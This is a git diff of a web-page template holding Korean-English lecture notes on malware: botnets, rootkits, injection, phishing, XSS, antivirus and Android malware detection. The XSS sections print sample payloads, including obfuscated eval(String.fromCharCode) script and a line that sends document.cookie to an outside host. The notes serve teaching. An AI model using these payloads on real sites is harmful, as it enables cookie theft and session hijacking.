@@ -1,5 +1,8 @@
-<template><div><h1 id="_07-malicious-software" tabindex="-1"><a class="header-anchor" href="#_07-malicious-software"><span>07. Malicious Software</span></a></h1>
+<template><div><section class="print-section">
+<h1 id="_07-malicious-software" tabindex="-1"><a class="header-anchor" href="#_07-malicious-software"><span>07. Malicious Software</span></a></h1>
 <DateMeta />
+</section>
+<section class="print-section">
 <h2 id="botnet-overview" tabindex="-1"><a class="header-anchor" href="#botnet-overview"><span>Botnet Overview</span></a></h2>
 <ul>
 <li><strong>botmaster</strong>
@@ -27,6 +30,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="botnet-–-infection-path" tabindex="-1"><a class="header-anchor" href="#botnet-–-infection-path"><span>BotNet – Infection Path</span></a></h2>
 <ul>
 <li>브라우저 취약점: 65%</li>
@@ -35,6 +40,8 @@
 <li>다운로드된 파일: 9%</li>
 <li>기타: 2%</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="countermeasures-against-botnets" tabindex="-1"><a class="header-anchor" href="#countermeasures-against-botnets"><span>Countermeasures against botnets</span></a></h2>
 <ul>
 <li>BotNet의 방어가 어려운 이유
@@ -53,6 +60,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="botnet-composition-and-operations" tabindex="-1"><a class="header-anchor" href="#botnet-composition-and-operations"><span>Botnet composition and operations</span></a></h2>
 <ol>
 <li>취약점, email 등을 통한 malware 전파</li>
@@ -67,6 +76,8 @@
 <li>Botmaster</li>
 <li>Victim</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="botnet-composition" tabindex="-1"><a class="header-anchor" href="#botnet-composition"><span>BotNet composition</span></a></h2>
 <ul>
 <li>Network protocol
@@ -81,6 +92,8 @@
 <li>C&amp;C server 구축 방법</li>
 <li>경찰에 의해 C&amp;C server가 폐쇄될 경우의 대처</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="rally-mechanism" tabindex="-1"><a class="header-anchor" href="#rally-mechanism"><span>Rally Mechanism</span></a></h2>
 <ul>
 <li>Hard-coded IP address vs Dynamic DNS (DDNS)</li>
@@ -96,7 +109,11 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="cctv-bots" tabindex="-1"><a class="header-anchor" href="#cctv-bots"><span>CCTV bots</span></a></h2>
+</section>
+<section class="print-section">
 <h2 id="remote-control-facility" tabindex="-1"><a class="header-anchor" href="#remote-control-facility"><span>Remote Control Facility</span></a></h2>
 <ul>
 <li>Bot과 worm의 구별
@@ -113,6 +130,8 @@
 <li>최신 botnet은 HTTP와 같은 protocol을 통한 은밀한 통신 채널 사용</li>
 <li>분산 제어 메커니즘은 단일 실패 지점을 피하기 위해 peer-to-peer protocol 사용</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="keylogger-및-spyware" tabindex="-1"><a class="header-anchor" href="#keylogger-및-spyware"><span>Keylogger 및 spyware</span></a></h2>
 <ul>
 <li><strong>Keylogger</strong>
@@ -130,6 +149,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="phising" tabindex="-1"><a class="header-anchor" href="#phising"><span>Phising</span></a></h2>
 <ul>
 <li><strong>Spear-phishing</strong>
@@ -147,6 +168,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="backdoor" tabindex="-1"><a class="header-anchor" href="#backdoor"><span>Backdoor</span></a></h2>
 <ul>
 <li>Trapdoor라고도 함.</li>
@@ -154,6 +177,8 @@
 <li>Maintenance hook은 프로그래머가 디버깅 및 테스트를 위해 사용하는 backdoor</li>
 <li>애플리케이션 내 backdoor에 대한 운영 체제 제어 구현의 어려움</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="rootkit" tabindex="-1"><a class="header-anchor" href="#rootkit"><span>Rootkit</span></a></h2>
 <ul>
 <li>시스템에 대한 은밀한 접근을 유지하기 위해 설치된 숨겨진 프로그램 집합</li>
@@ -161,6 +186,8 @@
 <li>공격자에게 관리자(또는 root) 권한 부여</li>
 <li>프로그램 및 파일 추가/변경, process 모니터링, network traffic 송수신, 필요 시 backdoor 접근 가능</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="rootkit-classification-characteristics" tabindex="-1"><a class="header-anchor" href="#rootkit-classification-characteristics"><span>Rootkit Classification Characteristics</span></a></h2>
 <ul>
 <li>Persistent</li>
@@ -170,13 +197,19 @@
 <li>Virtual machine based</li>
 <li>External mode</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="system-call-table-modification" tabindex="-1"><a class="header-anchor" href="#system-call-table-modification"><span>System Call Table Modification</span></a></h2>
 <p><img src="@source/cs/image-33.png" alt=""></p>
+</section>
+<section class="print-section">
 <h2 id="hw-based-rootkit-detection" tabindex="-1"><a class="header-anchor" href="#hw-based-rootkit-detection"><span>HW based Rootkit detection</span></a></h2>
 <ul>
 <li>System bus monitor를 사용한 kernel 무결성 모니터링
 <img src="@source/cs/image-30.png" alt=""></li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="phishing" tabindex="-1"><a class="header-anchor" href="#phishing"><span>Phishing</span></a></h2>
 <ul>
 <li>Voice phishing</li>
@@ -185,10 +218,14 @@
 <li>Email phishing</li>
 <li>Phishing site</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="cold-boot-attacks" tabindex="-1"><a class="header-anchor" href="#cold-boot-attacks"><span>Cold Boot Attacks</span></a></h2>
 <ul>
 <li>DRAM 내 encryption key에 대한 공격</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="dll-injection" tabindex="-1"><a class="header-anchor" href="#dll-injection"><span><code v-pre>dll</code> injection</span></a></h2>
 <ul>
 <li>Dll : dynamic link library
@@ -203,12 +240,16 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="process-injection-공격" tabindex="-1"><a class="header-anchor" href="#process-injection-공격"><span>Process Injection 공격</span></a></h2>
 <ul>
 <li>In-memory malware 또는 fileless malware에서 사용되는 공격 방법</li>
 <li>Process의 가상 메모리 실행 코드 부분을 공격자의 코드로 바꾸어 실행하게 하는 방법</li>
 <li>예: svchost.exe, dllhost.exe 등과 같은 process의 실행 코드 부분을 공격자의 코드로 변경</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="web-attacks-–-cybercrime-2-0" tabindex="-1"><a class="header-anchor" href="#web-attacks-–-cybercrime-2-0"><span>Web Attacks – Cybercrime 2.0</span></a></h2>
 <ul>
 <li>Browser 관련 공격
@@ -234,6 +275,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="web-attacks-cross-site-scripting-xss" tabindex="-1"><a class="header-anchor" href="#web-attacks-cross-site-scripting-xss"><span>Web Attacks - Cross Site Scripting (XSS)</span></a></h2>
 <ul>
 <li>Web application 보안의 일반적인 문제
@@ -254,6 +297,8 @@
 <span class="line"></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="web-attacks-cross-site-scripting-xss-1" tabindex="-1"><a class="header-anchor" href="#web-attacks-cross-site-scripting-xss-1"><span>Web Attacks - Cross Site Scripting (XSS)</span></a></h2>
 <div class="language-html line-numbers-mode" data-highlighter="prismjs" data-ext="html"><pre v-pre><code class="language-html"><span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>test<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
 <span class="line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>이미지 주소<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onLoad</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span></span>
@@ -276,7 +321,9 @@
 <span class="line">&lt;img src= ..... hack_frame.location.href='http://usecurity.hanyang.ac.kr/a.php?b=' +document.cookie</span>
 <span class="line">; ...></span>
 <span class="line"></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="owasp-top-10-2021" tabindex="-1"><a class="header-anchor" href="#owasp-top-10-2021"><span>OWASP TOP 10 (2021)</span></a></h2>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></section>
+<section class="print-section">
+<h2 id="owasp-top-10-2021" tabindex="-1"><a class="header-anchor" href="#owasp-top-10-2021"><span>OWASP TOP 10 (2021)</span></a></h2>
 <ol>
 <li>접근 제어 취약점 (Broken Access Control)</li>
 <li>암호화 실패 (Cryptographic Failures)</li>
@@ -289,6 +336,8 @@
 <li>보안 로깅 및 모니터링 실패 (Security Logging and Monitoring Failures)</li>
 <li>서버 측 요청 위조 (Server-Side Request Forgery, SSRF)</li>
 </ol>
+</section>
+<section class="print-section">
 <h2 id="sns" tabindex="-1"><a class="header-anchor" href="#sns"><span>SNS</span></a></h2>
 <p><img src="@source/cs/image-34.png" alt=""></p>
 <ul>
@@ -311,6 +360,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="spam-classification" tabindex="-1"><a class="header-anchor" href="#spam-classification"><span>Spam Classification</span></a></h2>
 <ul>
 <li>Clickthrough rate (CTR)
@@ -331,6 +382,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="malware-countermeasure-approaches" tabindex="-1"><a class="header-anchor" href="#malware-countermeasure-approaches"><span>Malware Countermeasure Approaches</span></a></h2>
 <ul>
 <li>Malware 위협에 대한 이상적인 해결책은 예방
@@ -353,6 +406,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="generations-of-anti-virus-software" tabindex="-1"><a class="header-anchor" href="#generations-of-anti-virus-software"><span>Generations of Anti-Virus Software</span></a></h2>
 <ul>
 <li>1세대: 단순 스캐너
@@ -379,6 +434,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="generic-decryption-gd" tabindex="-1"><a class="header-anchor" href="#generic-decryption-gd"><span>Generic Decryption (GD)</span></a></h2>
 <ul>
 <li>Anti-virus 프로그램이 빠른 scanning 속도를 유지하면서 복잡한 polymorphic virus 및 기타 malware를 쉽게 탐지 가능</li>
@@ -391,6 +448,8 @@
 </li>
 <li>GD scanner의 가장 어려운 설계 문제는 각 해석을 얼마나 오래 실행할지 결정하는 것임.</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="host-based-behavior-blocking-software" tabindex="-1"><a class="header-anchor" href="#host-based-behavior-blocking-software"><span>Host-Based Behavior-Blocking Software</span></a></h2>
 <ul>
 <li>Host 컴퓨터의 OS와 통합되어 악성 행위에 대해 프로그램 동작을 실시간 모니터링</li>
@@ -402,6 +461,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="perimeter-scanning-approaches" tabindex="-1"><a class="header-anchor" href="#perimeter-scanning-approaches"><span>Perimeter Scanning Approaches</span></a></h2>
 <ul>
 <li>조직의 firewall 및 IDS에서 실행되는 email 및 web proxy 서비스에 일반적으로 anti-virus 소프트웨어 포함</li>
@@ -425,6 +486,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="worm-countermeasures" tabindex="-1"><a class="header-anchor" href="#worm-countermeasures"><span>Worm Countermeasures</span></a></h2>
 <ul>
 <li>Virus와 worm 대응 기술에 상당한 중복 존재</li>
@@ -441,6 +504,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="digital-immune-system" tabindex="-1"><a class="header-anchor" href="#digital-immune-system"><span>Digital Immune System</span></a></h2>
 <p><img src="@source/cs/image.png" alt=""></p>
 <ul>
@@ -453,7 +518,11 @@
 </ol>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h1 id="android-malware-detection" tabindex="-1"><a class="header-anchor" href="#android-malware-detection"><span>Android Malware Detection</span></a></h1>
+</section>
+<section class="print-section">
 <h2 id="droidapiminer" tabindex="-1"><a class="header-anchor" href="#droidapiminer"><span><code v-pre>DroidAPIMiner</code></span></a></h2>
 <ul>
 <li>설치 시점의 API level 분석
@@ -465,6 +534,8 @@
 <li>정적 분석
 <img src="@source/cs/image-35.png" alt=""></li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="madam" tabindex="-1"><a class="header-anchor" href="#madam"><span>MADAM</span></a></h2>
 <p><img src="@source/cs/image-36.png" alt=""></p>
 <ul>
@@ -481,6 +552,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="android-malware-analysis-with-machine-learning" tabindex="-1"><a class="header-anchor" href="#android-malware-analysis-with-machine-learning"><span>Android Malware Analysis with Machine Learning</span></a></h2>
 <p><img src="@source/cs/image-37.png" alt=""></p>
 <ul>
@@ -489,7 +562,11 @@
 <li>Google Scholar 인용: 193</li>
 <li>탐지 정확도: 98%</li>
 </ul>
+</section>
+<section class="print-section">
 <h1 id="malware-analysis" tabindex="-1"><a class="header-anchor" href="#malware-analysis"><span>Malware Analysis</span></a></h1>
+</section>
+<section class="print-section">
 <h2 id="issues-on-malware-analysis" tabindex="-1"><a class="header-anchor" href="#issues-on-malware-analysis"><span>Issues on Malware Analysis</span></a></h2>
 <ul>
 <li>Malware 방어
@@ -502,10 +579,16 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="pe-file-format" tabindex="-1"><a class="header-anchor" href="#pe-file-format"><span>PE file format</span></a></h2>
 <p><img src="@source/cs/image-32.png" alt=""></p>
+</section>
+<section class="print-section">
 <h2 id="virtual-address-space" tabindex="-1"><a class="header-anchor" href="#virtual-address-space"><span>Virtual address space</span></a></h2>
 <p><img src="@source/cs/image-5.png" alt=""></p>
+</section>
+<section class="print-section">
 <h2 id="static-analysis-vs-dynamic-analysis" tabindex="-1"><a class="header-anchor" href="#static-analysis-vs-dynamic-analysis"><span>Static Analysis vs. Dynamic Analysis</span></a></h2>
 <ul>
 <li>정적 분석
@@ -536,6 +619,8 @@
 </li>
 <li>동적 분석 기술을 이용한 분석 필요!</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="dynamic-analysis" tabindex="-1"><a class="header-anchor" href="#dynamic-analysis"><span>Dynamic Analysis</span></a></h2>
 <p><img src="@source/cs/image-4.png" alt=""></p>
 <ul>
@@ -560,6 +645,8 @@
 <li>PIN Visual Studio 2010</li>
 <li>PowerCLI</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="frequency-analysis-opcode-frequency" tabindex="-1"><a class="header-anchor" href="#frequency-analysis-opcode-frequency"><span>Frequency Analysis - Opcode Frequency</span></a></h2>
 <table>
 <thead>
@@ -752,6 +839,8 @@
 </ul>
 </li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="redundancy-filtering-experiment" tabindex="-1"><a class="header-anchor" href="#redundancy-filtering-experiment"><span>Redundancy Filtering - Experiment</span></a></h2>
 <ul>
 <li>Block 수 비교</li>
@@ -827,6 +916,8 @@
 </tr>
 </tbody>
 </table>
+</section>
+<section class="print-section">
 <h2 id="malware-visualization" tabindex="-1"><a class="header-anchor" href="#malware-visualization"><span>Malware Visualization</span></a></h2>
 <ul>
 <li>Malware 이미지
@@ -845,10 +936,16 @@
 </li>
 <li>ML 기술 적용 시도</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="anti-forensic-techniques" tabindex="-1"><a class="header-anchor" href="#anti-forensic-techniques"><span>Anti-Forensic techniques</span></a></h2>
 <p><img src="@source/cs/image-2.png" alt=""></p>
+</section>
+<section class="print-section">
 <h2 id="packing-example" tabindex="-1"><a class="header-anchor" href="#packing-example"><span>Packing Example</span></a></h2>
 <p><img src="@source/cs/image-1.png" alt=""></p>
+</section>
+<section class="print-section">
 <h2 id="packing-trends" tabindex="-1"><a class="header-anchor" href="#packing-trends"><span>Packing Trends</span></a></h2>
 <p><img src="@source/cs/image-31.png" alt=""></p>
 <ul>
@@ -857,6 +954,8 @@
 <li>PE 파일 대상</li>
 <li>Packer</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="packing-complexity" tabindex="-1"><a class="header-anchor" href="#packing-complexity"><span>Packing Complexity</span></a></h2>
 <table>
 <thead>
@@ -900,12 +999,16 @@
 </tr>
 </tbody>
 </table>
+</section>
+<section class="print-section">
 <h2 id="malware-entropy" tabindex="-1"><a class="header-anchor" href="#malware-entropy"><span>Malware Entropy</span></a></h2>
 <p><img src="@source/cs/image-39.png" alt=""></p>
 <ul>
 <li>파일의 무작위성(randomness)을 측정하는 척도</li>
 <li>패킹되거나 암호화된 파일은 일반적으로 엔트로피가 높게 나타나므로, 악성코드 탐지의 한 지표로 사용될 수 있음.</li>
 </ul>
+</section>
+<section class="print-section">
 <h2 id="malware-analysis-tools" tabindex="-1"><a class="header-anchor" href="#malware-analysis-tools"><span>Malware Analysis Tools</span></a></h2>
 <ul>
 <li>Virus Total: 웹 기반 서비스로, 여러 anti-virus 엔진을 사용하여 파일을 스캔하고 분석 결과를 제공</li>
@@ -913,6 +1016,7 @@
 <li>Detect It Easy (DIE): 파일의 종류, 사용된 패커, 엔트로피, 문자열 등 다양한 정보를 분석하는 도구</li>
 <li>IDA Pro: Hex-rays사에서 개발한 강력한 disassembler 도구로, 리버스 엔지니어링 및 악성코드 분석에 널리 사용</li>
 </ul>
+</section>
 </div></template>
 
 
